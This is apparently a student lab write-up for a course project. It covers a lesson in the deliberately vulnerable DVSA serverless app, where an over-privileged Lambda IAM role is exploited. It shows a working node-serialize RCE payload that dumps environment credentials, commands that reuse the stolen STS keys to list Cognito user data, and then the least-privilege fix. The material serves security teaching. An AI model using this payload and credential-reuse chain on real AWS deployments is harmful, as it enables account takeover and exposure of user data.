

---

# ICS344_Project

# DVSA Lesson 7 — Over-Privileged Function (IAM Misconfiguration)

## Overview

This lesson demonstrates an **Over-Privileged Function** vulnerability in the Damn Vulnerable Serverless Application (DVSA), where a Lambda function is assigned excessive IAM permissions.

## Vulnerability

The Lambda execution role (`DVSA-ORDER-MANAGER`) is granted overly broad permissions, including:

```
cognito-idp:*
```

This allows the function to access sensitive AWS services (e.g., Cognito) that are unrelated to its intended purpose (order management).

If the function is compromised, an attacker can abuse these permissions to access or manipulate sensitive data across the system.

---

## Exploitation Steps

### Phase 1 — Remote Code Execution (RCE)

1. Send a malicious payload to exploit insecure deserialization:

```bash
curl -X POST "https://<API_ID>.execute-api.us-east-1.amazonaws.com/dvsa/order" \
-H "Content-Type: application/json" \
--data-raw '{
  "action": "create",
  "data": "_$$ND_FUNC$$_function(){ console.log(\"---IDENTITY_LEAK---\"); console.log(JSON.stringify(process.env)); }()"
}'
```

2. Result:

   * API returns `Internal server error`
   * CloudWatch logs show environment variables (including AWS credentials)

---

### Phase 2 — Extract STS Credentials

3. From CloudWatch logs, retrieve:

   * `AWS_ACCESS_KEY_ID`
   * `AWS_SECRET_ACCESS_KEY`
   * `AWS_SESSION_TOKEN`

---

### Phase 3 — Assume Lambda Identity

4. Set credentials locally:

```bash
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
export AWS_DEFAULT_REGION=us-east-1
```

5. Verify identity:

```bash
aws sts get-caller-identity
```

6. Result:

   * Identity = `DVSA-ORDER-MANAGER` role
   * Confirms successful role hijack

---

### Phase 4 — Abuse Over-Privileged Permissions

7. Access sensitive Cognito data:

```bash
aws cognito-idp list-users \
--user-pool-id us-east-1_kFh2dx2cN \
--region us-east-1
```

8. Result:

   * User emails exposed
   * Phone numbers exposed
   * Unauthorized access confirmed

---

## Fix Applied

* Removed excessive permissions from IAM role
* Specifically removed:

```
cognito-idp:*
cognito-identity:*
cognito-sync:*
```

* Applied **Principle of Least Privilege**
* Ensured role only has permissions required for order processing

---

## Verification

After applying the fix:

```bash
aws cognito-idp list-users \
--user-pool-id us-east-1_kFh2dx2cN \
--region us-east-1
```

* Result:

  ```
  AccessDeniedException
  ```

* Unauthorized access is blocked

* Lambda still performs legitimate order operations correctly

---

## Folder Structure

* fixed-code/ → updated IAM policy (restricted permissions)

* vulnerable-code/ → original over-privileged IAM policy

* screenshots/ → evidence (attack + fix validation)

  * Phase1-RCE-Payload.png
  * Phase1-STS-Credentials.png
  * Phase2-Stolen_STS-Credentials.png
  * Phase3-STS-Identity-Hijack-Success.png
  * Phase5-Cognito-Data-Exposure.png
  * attack-after-fix.png

* Lesson7.md → readme file

---

## How to Reproduce

1. Send malicious RCE payload to API
2. Retrieve environment variables from CloudWatch
3. Extract AWS STS credentials
4. Set credentials locally
5. Verify identity using AWS CLI
6. Run Cognito command to list users
7. Observe sensitive data exposure
8. Apply IAM policy fix
9. Repeat command → should fail (AccessDenied)

---

## Security Lesson

Serverless applications must enforce **least privilege IAM policies**.

Over-privileged functions significantly increase the impact of compromise, allowing attackers to move across services and access sensitive data.

Restricting permissions to only what is strictly required helps reduce the attack surface and limits the damage of potential exploits.

---


